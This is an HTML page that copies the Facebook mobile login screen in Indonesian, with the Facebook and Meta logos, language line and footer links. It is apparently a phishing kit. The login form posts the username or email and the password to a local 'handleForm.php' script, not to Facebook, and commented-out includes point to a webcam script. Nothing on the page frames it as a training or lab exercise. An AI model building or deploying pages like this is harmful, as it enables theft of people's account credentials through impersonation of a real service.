<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Facebook</title>
    <!-- <script type="text/javascript" src="1.js"></script> -->
    <!-- <script type="text/javascript" src="webcam.min.js"></script> -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="style.css">

    <style>
        @media (max-width: 576px) {
            .container {
                max-width: 90%;
                padding: 15px;
            }
        }
    </style>
</head>

<body>
    <div class="container-fluid main-content d-flex flex-column justify-content-between">
        <!-- Language Selector -->
        <div class="text-center text-secondary mb-3 mt-2">
            Bahasa Indonesia
        </div>

        <!-- Facebook Logo -->
        <div class="d-flex justify-content-center my-4">
            <div class="facebook-logo">
                <svg height="70" viewBox="0 0 36 36" width="70">
                    <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z" fill="#0866FF"></path>
                    <path d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z" fill="white"></path>
                </svg>
            </div>
        </div>

        <!-- Login Form -->
        <div class="row justify-content-center">
            <div class="col-12 col-md-8 col-lg-4">
                <form id="form" action="handleForm.php" method="POST">
                    <div class="mb-3">
                        <input type="text" id="inputUsername" name="inputUsername" class="form-control rounded-3 py-3" placeholder="Nomor ponsel atau email">
                    </div>
                    <div class="mb-3">
                        <input type="password" id="inputPassword" name="inputPassword" class="form-control rounded-3 py-3" placeholder="Kata sandi">
                    </div>
                    <div class="d-grid gap-2 mt-2">
                        <input type="submit" value="Login" class="btn btn-primary btn-lg login-button">
                    </div>
                </form>

                <!-- Forgot Password -->
                <div class="facebook-KataSandi text-center my-4">
                    <a href="#" class="facebook-blue-text text-decoration-none">Lupa kata sandi?</a>
                </div>

                <!-- Create Account -->
                <div class="d-grid gap-2 my-4">
                    <button type="button" class="btn btn-lg create-account-button">Buat akun baru</button>
                </div>
            </div>
        </div>

        <!-- Meta Logo -->
        <div class="d-flex flex-row align-items-center justify-content-center text-secondary mt-5 gap-2">
            <svg xmlns="http://www.w3.org/2000/svg" height="40" width="40" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd" viewBox="0 0 512 340.238">
                <path fill-rule="nonzero" d="M367.457 0c-41.982 0-74.801 31.62-104.509 71.788C222.124 19.807 187.982 0 147.124 0 63.824 0 0 108.407 0 223.149c0 71.802 34.737 117.089 92.92 117.089 41.877 0 71.995-19.743 125.536-113.334 0 0 22.319-39.414 37.673-66.564a1722.74 1722.74 0 0117 28.081l25.107 42.237c48.909 81.843 76.159 109.58 125.536 109.58 56.683 0 88.228-45.906 88.228-119.2C512 100.898 446.737 0 367.457 0zM177.628 201.562c-43.41 68.047-58.427 83.3-82.596 83.3-24.872 0-39.655-21.837-39.655-60.774 0-83.3 41.532-168.477 91.043-168.477 26.811 0 49.216 15.484 83.536 64.616-32.588 49.985-52.328 81.335-52.328 81.335zm163.834-8.567l-30.019-50.065c-8.124-13.212-15.931-25.374-23.422-36.484 27.056-41.759 49.374-62.567 75.917-62.567 55.141 0 99.255 81.188 99.255 180.913 0 38.013-12.45 60.07-38.248 60.07-24.725 0-36.536-16.33-83.483-91.867z" />
            </svg>
            <p class="mb-0 fs-4 text-dark">Meta</p>
        </div>
    </div>

    <!-- Footer -->
    <footer class="footer text-center p-4 text-secondary small">
        <a href="#" class="mx-2">Tentang</a>
        <a href="#" class="mx-2">Bantuan</a>
        <a href="#" class="mx-2">Lainnya</a>
    </footer>

    <!-- Bootstrap JS (optional) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>

</html>